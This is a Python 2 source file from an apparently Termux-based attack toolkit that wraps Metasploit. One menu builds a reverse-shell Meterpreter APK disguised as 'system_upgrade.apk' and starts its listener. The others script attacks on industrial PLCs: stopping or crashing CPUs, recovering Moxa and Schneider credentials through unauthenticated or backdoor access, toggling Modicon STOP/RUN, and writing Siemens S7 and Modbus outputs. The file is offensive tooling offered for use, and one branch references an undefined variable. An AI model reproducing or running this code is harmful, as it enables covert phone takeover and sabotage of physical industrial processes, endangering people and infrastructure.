#!/data/data/com.termux/files/usr/bin/python2
# -*- coding: utf-8 -*-

import subprocess, sys, os, socket

sys.path.append("/data/data/com.termux/files/usr/share/txtool/core")
from fungsi import warna, empty, IP2, txtool_dir, finish_exploit, IP
from sub_menu import kembali
import sub_menu3 as back

path = "/data/data/com.termux/files/usr/share/txtool/core"

if os.path.isfile("/data/data/com.termux/files/usr/bin/msfvenom"):
    if os.path.isfile("/data/data/com.termux/files/usr/bin/msfconsole"):
        metasploit_path = "/data/data/com.termux/files/usr/bin"

elif os.path.isdir("/data/data/com.termux/files/home/metasploit-framework"):
    metasploit_path = "/data/data/com.termux/files/home/metasploit-framework"


def start():
    print(warna.hijau + "\n[*] " + warna.tutup + "fire up metasploit, please wait a moment...\n")
    subprocess.Popen("%s/msfconsole -q -r %s/payload.rc" %
                      (metasploit_path, txtool_dir), shell=True).wait()

def menu1():
    alamat_ip = IP2()
    lhost = alamat_ip
    port = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter Port for reverse listener [1492]" + warna.kuning + "  >> " + warna.tutup)
    if port == "": port = "1492"
    payload = 'android/meterpreter/reverse_tcp'
    print(warna.hijau + "\n[*] " + warna.tutup + " creating mallicious app, please wait a moment...")
    subprocess.Popen("%s/msfvenom -p %s LHOST=%s LPORT=%s R> %s/system_upgrade.apk" %
        (metasploit_path, payload, lhost, port, txtool_dir),stderr=subprocess.PIPE, stdout=subprocess.PIPE, shell=True).wait()
    print(warna.hijau + "\n[*] " + warna.tutup + " successfully creating mallicious app, apk file has been saved to %s/system_upgrade.apk\n" %
        (txtool_dir))
    filewrite = open(txtool_dir + "/payload.rc", "w")
    filewrite.write("use multi/handler\nset payload %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\r\n\r\n" %
        (payload, lhost, port))
    filewrite.close()
    payload_query = raw_input((warna.biru + "[+]" + warna.tutup + " Do you want to start listener right now ? {0}(yes/no){1}" + warna.kuning + "  >> " + warna.tutup).format(warna.hijau, warna.tutup))
    if payload_query == '' or payload_query.lower() == "y" or payload_query.lower() == "yes":
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        kembali()

    elif payload_query.lower() == "n" or payload_query.lower() == "no":
        print("\n{0}Canceled{1}".format(warna.merah, warna.tutup))
        kembali()

    else:
        try:
            return kembali()

        except KeyError:
            kembali()


def menu5():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " The EtherNet/IP CIP protocol allows a number of unauthenticated commands to a PLC which implements the protocol.  This module implements the CPU STOP command, as well as the ability to crash the Ethernet card in an affected device.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " only 4 attacks that will be accepted.\n (STOPCPU, CRASHCPU, CRASHETHER, RESETETHER)")
    print(warna.hijau + "[*] " + warna.tutup + " Attacks : \n\t1 = STOPCPU\n\t2 = CRASHCPU\n\t3 = CRASHETHER\n\t4 = RESETETHER\n")
    attack = raw_input(warna.biru + "[+] " + warna.tutup + " The attack to use" + warna.kuning + "  >>  " + warna.tutup)
    if attack == '':
        empty()
        back.menu['menu_utama']()

    if attack == '1':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK STOPCPU\nexploit\r\n\r\n" % (ip))

        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if attack == '2':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK CRASHCPU\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if attack == '3':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK CRASHETHER\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if attack == '4':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/multi_cip_command\nset RHOST %s\nset ATTACK RESETETHER\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else: return False


def menu6():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " The Moxa protocol listens on 4800/UDP and will respond to broadcast or direct traffic.  The service is known to be used on Moxa devices in the NPort, OnCell, and MGate product lines.  Many devices with firmware versions older than 2017 or late 2016 allow admin credentials and SNMP read and read/write community strings to be retrieved without authentication.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " only 2 function that will be accepted. (CREDS or ENUM)")
    print(warna.hijau + "[*] " + warna.tutup + " Functions : \n\t1 = CREDS\n\t2 = ENUM\n")
    print(warna.kuning + "[!] " + warna.tutup + " Pull credentials or enumerate all function codes")
    function = raw_input(warna.biru + "[+] " + warna.tutup + " Set function" + warna.kuning + " >>  " + warna.tutup)
    if function == '':
        empty()
        back.menu['menu_utama']()

    if function == '1':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/moxa_credentials_recovery\nset RHOST %s\nset FUNCTION CREDS\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if function == '2':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/moxa_credentials_recovery\nset RHOST %s\nset FUNCTION ENUM\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else: return False


def menu7():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " The Schneider Modicon Quantum series of Ethernet cards store usernames and passwords for the system in files that may be retrieved via backdoor access.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " The backdoor account to use for login")
    username = raw_input(warna.biru + "[+] " + warna.tutup + " Enter the username" + warna.kuning + " >> " + warna.tutup)
    if username == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " The backdoor password to use for login")
    password = raw_input(warna.biru + "[+] " + warna.tutup + " Enter password" + warna.kuning + " >> " + warna.tutup)
    if password == '':
        empty()
        back.menu['menu_utama']()

    else:
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/modicon_password_recovery\nset RHOST %s\nset FTPUSER %s\nset FTPPASS %s\nexploit\r\n\r\n" %
                        (ip, username, password))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()


def menu8():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " allows a remote user to change the state of the PLC between STOP and RUN, allowing an attacker to end process control by the PLC.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + " >> " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " only 2 commands that will be accepted. (STOP or RUN)")
    print(warna.hijau + "\n[*] " + warna.tutup + " Command : \n\t1 = STOP\n\t2 = RUN\n")
    command = raw_input(warna.biru + "[+] " + warna.tutup + " Set the command" + warna.kuning + "  >>  " + warna.tutup)
    if command == '':
        empty()
        back.menu['menu_utama']()

    if command == '1':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/modicon_command\nset RHOST %s\nset MODE STOP\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if command == '2':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/admin/scada/modicon_command\nset RHOST %s\nset MODE RUN\nexploit\r\n\r\n" % (ip))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else: return False


def menu9():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " Print out CPU status and reverts it, tested and working on ILC150 (at least partially working on others")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address" + warna.kuning + "  >>  " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    else:
        subprocess.Popen("%s/PhoenixControlPLC-ILC150.py %s " %
                         (path, ip), shell=True).wait()


def menu10():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " reading inputs, setting outputs, and merkers of for Siemens S7-1200 (firmware <= v3)")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address" + warna.kuning + "  >>  " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " The default port is 102")
    port = raw_input(warna.biru + "[+] " + warna.tutup + " Enter Port number  [102]" + warna.kuning + "  >>  " + warna.tutup)
    if port == "":
        port = "102"

    print(warna.kuning + '\n[!] ' + warna.tutup + ' Example : "10101010,3" to set merkers 3.0 through 3.7')
    merker = raw_input(warna.biru + "[+] " + warna.tutup + " Set the merkers" + warna.kuning + "  >>  " + warna.tutup)
    print(warna.kuning + '\n[!] ' + warna.tutup + ' Example set output : "00000000"')
    output = raw_input(warna.biru + "[+] " + warna.tutup + " Set outputs" + warna.kuning + "  >>  " + warna.tutup)
    if output == '' and port == '' and merker =='':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -r " %
                         (path, ip), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()

    if port == '' and merker =='':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -o %s " %
                         (path, ip, output), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()

    if port == '' and output == '':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p 102 -m %s " %
                         (path, ip, merker), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()

    elif merker =='' and output == '':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -r " %
                         (path, ip, port), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()

    elif merker =='':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -o %s " %
                         (path, ip, port, output), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()

    elif output == '':
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -m %s " %
                         (path, ip, port, marker), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()

    else:
        subprocess.Popen("%s/S7-1200-Workshop.py -t %s -p %s -o %s -m %s " %
                         (path, ip, port, output, merker), shell=True).wait()
        finish_exploit()
        back.menu['menu_utama']()


def menu11():
    IP()
    print(warna.kuning + "\n[!] " + warna.tutup + " reading and writing data to a PLC using the Modbus protocol.")
    ip = raw_input(warna.biru + "\n[+] " + warna.tutup + " Enter IP address of the PLC (RHOST) " + warna.kuning + "  >>  " + warna.tutup)
    if ip == '':
        empty()
        back.menu['menu_utama']()

    print(warna.kuning + "\n[!] " + warna.tutup + " Modbus data address")
    data_address = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA_ADDRESS" + warna.kuning + "  >>  " + warna.tutup)
    if data_address == '':
        empty()
        back.menu['menu_utama']()

    print(warna.hijau + "\n[*] " + warna.tutup + " ACTION : \n\t1 = READ_REGISTERS\n\t2 = READ_COILS\n\t3 = WRITE_REGISTER\n\t4 = WRITE_COIL")
    print(warna.kuning + "\n[!] " + warna.tutup + " default action is 1")
    action = raw_input(warna.biru + "[+] " + warna.tutup + " Choose an action" + warna.kuning + "  >>  " + warna.tutup)
    if action == '1' or action == '':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset ACTION READ_REGISTERS\nexploit\r\n\r\n" %
                        (ip, data_address))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    if action == '2':
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset ACTION READ_COILS\nexploit\r\n\r\n" %
                        (ip, data_address))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    elif action == '3':
        print(warna.kuning + '\n[!] ' + warna.tutup + ' only 2 options "0 or 1", (de-activate or activate)')
        data = raw_input(warna.biru + "[+] " + warna.tutup + "set DATA" + warna.kuning + "  >>  " + warna.tutup)
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_REGISTER\nexploit\r\n\r\n" %
                        (ip, data_address, data))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    elif action == '4':
        print(warna.kuning + '\n[!] ' + warna.tutup + ' only 2 options "0 or 1", (de-activate or activate)')
        data = raw_input(warna.biru + "[+] " + warna.tutup + " set DATA" + warna.kuning + "  >>  " + warna.tutup)
        filewrite = open(txtool_dir + "/payload.rc", "w")
        filewrite.write("use auxiliary/scanner/scada/modbusclient\nset RHOST %s\nset DATA_ADDRESS %s\nset DATA %s\nset ACTION WRITE_COIL\nexploit\r\n\r\n" %
                        (ip, data_address, data))
        filewrite.close()
        start()
        finish_exploit()
        os.system("cd /data/data/com.termux/files/home/.txtool && rm -rf payload.rc")
        back.menu['menu_utama']()

    else: return False
